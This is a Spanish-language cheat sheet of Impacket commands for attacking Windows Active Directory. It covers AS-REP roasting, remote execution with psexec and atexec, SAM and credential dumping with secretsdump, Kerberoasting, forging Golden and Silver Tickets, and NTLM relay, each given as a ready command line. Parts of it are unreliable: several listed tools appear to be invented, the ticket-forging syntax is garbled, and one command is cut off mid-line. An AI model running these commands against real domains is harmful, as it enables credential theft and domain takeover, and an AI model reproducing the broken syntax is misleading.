### impacket-GetNPUsers:
Descripción: Extrae tickets TGT (Ticket Granting Ticket) sin necesidad de autenticación de contraseña, utilizando el protocolo Kerberos.
```python
impacket-GetNPUsers DOMAIN/USER -dc-ip <domain_controller_ip>
```
### impacket-psexec:
Descripción: Ejecuta comandos en un sistema remoto utilizando el servicio PsExec.
```python
impacket-psexec.py DOMAIN/USER:PASSWORD@TARGET_HOST CMD.EXE
```
### impacket-rpcdump:
Descripción: Realiza una enumeración de RPC en un host remoto.
```python
impacket-rpcdump.py DOMAIN/USER:PASSWORD@TARGET_HOST
```
### impacket-secretsdump:
Descripción: Extrae contraseñas almacenadas en la SAM (Security Accounts Manager) de un sistema Windows.
```python
impacket-secretsdump.py DOMAIN/USER:PASSWORD@TARGET_HOST
```
### impacket-GetUserSPNs:
enumerar los SPNs asociados a un usuario específico o a todos los usuarios en un dominio.
```python
impacket-GetUserSPNs.py -request <USER>:<PASSWORD> -dc-ip <DOMAIN_CONTROLLER_IP> <DOMAIN>/<USER>
```
### impacket-GetUserSPNs
Obtención del TGS: Una vez que hayas identificado el SPN deseado, puedes solicitar un TGS para ese SPN utilizando `GetUserSPNs
```python
impacket-GetUserSPNs.py <USER>:<PASSWORD> -spn <SPN_TO_TARGET> -dc-ip <DOMAIN_CONTROL
```
### impacket-ticketer Golden Ticket:
Para solicitar un Golden Ticket con Impacket, puedes usar `ticketer.py`. Aquí tienes un ejemplo de cómo hacerlo:
```python
impacket-ticketer.py -nthash <USER_NT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN_NAME> -sid <USER_SID> -krbtgt <KRBTGT_HASH> -des <DESCRIPTOR> -rc4 <RC4_HASH> <USER_NAME>
------------------------------------------------------------------------------------------------------------------------------------------
Donde:    
    - `<USER_NT_HASH>` es el hash NT (hash de la contraseña) del usuario.
    - `<DOMAIN_SID>` es el SID (identificador de seguridad) del dominio.
    - `<DOMAIN_NAME>` es el nombre del dominio.
    - `<USER_SID>` es el SID del usuario.
    - `<KRBTGT_HASH>` es el hash del usuario KRBTGT.
    - `<DESCRIPTOR>` es el descriptor de seguridad del usuario (opcional).
    - `<RC4_HASH>` es el hash RC4 (opcional).
    - `<USER_NAME>` es el nombre de usuario del usuario.
```
### impacket-ticketer Silver Ticket:
Para solicitar un Silver Ticket con Impacket, también puedes usar `ticketer.py`. Aquí tienes un ejemplo de cómo hacerlo:
```python
impacket-ticketer.py -nthash <USER_NT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN_NAME> -sid <USER_SID> -krbtgt <KRBTGT_HASH> -spn <SERVICE_SPN> <USER_NAME>
------------------------------------------------------------------------------------------------------------------------------------------
Donde:
    
    - `<USER_NT_HASH>` es el hash NT (hash de la contraseña) del usuario.
    - `<DOMAIN_SID>` es el SID (identificador de seguridad) del dominio.
    - `<DOMAIN_NAME>` es el nombre del dominio.
    - `<USER_SID>` es el SID del usuario.
    - `<KRBTGT_HASH>` es el hash del usuario KRBTGT.
    - `<SERVICE_SPN>` es el Service Principal Name (SPN) del servicio al que deseas acceder.
    - `<USER_NAME>` es el nombre de usuario del usuario.
```
### impacket-atexec:
Descripción: Permite ejecutar comandos en un sistema remoto utilizando el servicio Task Scheduler (programador de tareas).
```python
impacket-atexec.py DOMAIN/USER:PASSWORD@TARGET_HOST COMMAND
```
### impacket-dpapi:
Descripción: Proporciona herramientas para manipular DPAPI (Data Protection API) en sistemas Windows.
```python
impacket-dpapi.py
```
### impacket-esentutl:
Descripción: Permite interactuar con bases de datos ESENT (Extensible Storage Engine) en sistemas Windows.
```python
impacket-esentutl.py
```
### impacket-getArch:
Descripción: Obtiene la arquitectura del sistema remoto (32 o 64 bits).
```python
impacket-getArch.py DOMAIN/USER:PASSWORD@TARGET_HOST
```
### impacket-mssqlclient:
Descripción: Un cliente interactivo de SQL Server que se puede utilizar para ejecutar consultas SQL y comandos en un sistema remoto que ejecuta SQL Server.
```python
impacket-mssqlclient.py DOMAIN/USER:PASSWORD@TARGET_HOST
```
### impacket-mssqlinstance:
Descripción: Enumera las instancias de SQL Server en un sistema remoto.
```python
impacket-mssqlinstance.py DOMAIN/USER:PASSWORD@TARGET_HOST
```
### impacket-mssqlping:
Descripción: Realiza un ping a un servidor SQL para verificar la disponibilidad.
```python
impacket-mssqlping.py DOMAIN/USER:PASSWORD@TARGET_HOST
```
### impacket-mssqlservice:
Descripción: Enumera los servicios de SQL Server en un sistema remoto.
```python
impacket-mssqlservice.py DOMAIN/USER:PASSWORD@TARGET_HOST
```
### impacket-ntlmrelayx:
Descripción: Se utiliza para realizar ataques de relé NTLM en redes corporativas.
```python
impacket-ntlmrelayx.py -tf targets.txt
```